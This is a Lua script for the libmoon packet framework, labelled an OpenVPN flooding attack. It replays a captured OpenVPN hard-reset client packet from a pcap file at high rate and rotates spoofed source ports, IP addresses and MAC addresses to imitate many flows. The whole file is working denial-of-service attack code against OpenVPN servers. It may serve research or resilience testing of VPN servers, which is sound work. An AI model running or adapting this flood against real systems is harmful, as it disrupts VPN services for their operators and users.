--- A simple OpenVPN flooding attack script
local lm = require "libmoon"
local log = require "log"
local memory = require "memory"
local pcap = require "pcap"

local attack = require "attack"
local fieldModifier = require "fieldModifier"

local ffi = require "ffi"

local PKT_LEN = 60

-- the configure function is called on startup with a pre-initialized command line parser
function configure(parser)
	attack.configure_pars(parser)
	parser:description("OpenVPN.")
	parser:option("--flows", "Number of flows used in the flood by using different source ports. 0 results in 65535 flows (max port count)."):args(1):convert(tonumber):default(1)
	parser:option("--ipFlows", "Number of flows used in the flood by using different source IP addresses. Max 255"):args(1):convert(tonumber):default(1)
	parser:option("--ethFlows", "Number of flows used in the flood by using different source ethernet addresses. Max 255"):args(1):convert(tonumber):default(1)
	parser:option("--pchrcv2Pcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file."):args(1)
	parser:option("--pchrcv2TlsAuthPcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-auth."):args(1)
	parser:option("--pchrcv2TlsCryptPcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-crypt."):args(1)
	parser:option("--pchrcv3TlsCryptV2Pcap", "P_CONTROL_HARD_RESET_CLIENT_V2 pcap file with tls-crypt-v2."):args(1)

	return parser:parse()
end

master = attack.main

local taskRunning = attack.taskRunning
local createPkt

function txTask(threadId, queue, args)
	log:info("Start txTask.")

	local slowRate = false
	local lastSent = 0
	if args.rate < 100 then
		slowRate = args.queueRate
	end

	local mempool = memory:createMemPool()
	local bufs = mempool:bufArray()

	local pktPrototype, pktLen = createPkt(args, mempool)

	local udpSrcModifier
	if args.flows and not (args.flows == 1) then
		udpSrcModifier = fieldModifier.field_inc.udpSrc((args.flows))
	end

	local ipSrcModifier
	if args.ipFlows and not (args.ipFlows == 1) then
		ipSrcModifier = fieldModifier.field_inc.ipSrc_3(args.ipFlows)
	end

	local ethSrcModifier
	if args.ethFlows and not (args.ethFlows == 1) then
		ethSrcModifier = fieldModifier.field_inc.ethSrc_5(args.ethFlows)
	end

	attack.txTask_sync_start(args)

	while taskRunning(args) do -- check if Ctrl+c was pressed
		if slowRate then
			bufs:allocN(pktLen, 1)
		else
			bufs:alloc(pktLen)
		end
		local sizeSum = 0

		for i, buf in ipairs(bufs) do
			local pkt = buf:getUdpPacket()
			ffi.copy(pkt, pktPrototype, pktLen)

			sizeSum = sizeSum + buf:getSize()

			if udpSrcModifier then
				udpSrcModifier:set_field(pkt)
			end
			
			if ipSrcModifier then
				ipSrcModifier:set_field(pkt)
			end

			if ethSrcModifier then
				ethSrcModifier:set_field(pkt)
			end

			attack.txTask_setChecksumOffloading(buf, args)
		end

		if slowRate then
			local now = lm.getTime()
			local sizeBit = sizeSum * 8

			while (sizeBit / (now - lastSent)) > slowRate * 1000000 do
				now = lm.getTime()
			end
			lastSent = now
		end
		attack.txTask_send(queue, bufs)
	end

	log:info("Terminate txTask.")
end

function createPkt(args, mempool)

	local pcapFile = args.pchrcv2Pcap or args.pchrcv2TlsAuthPcap or args.pchrcv2TlsCryptPcap  or args.pchrcv3TlsCryptV2Pcap

	local pcapReader = pcap:newReader(pcapFile)
	local buf = pcapReader:readSingle(mempool)

	attack.modifyPkt(buf, args)

	local pkt = buf:getRawPacket()

	local pktLength = buf.pkt_len

	-- raw packet
	local res = ffi.new("uint8_t [?]", pktLength)
	ffi.copy(res, pkt, pktLength)

	buf:free()
	pcapReader:close()

	return res, pktLength
end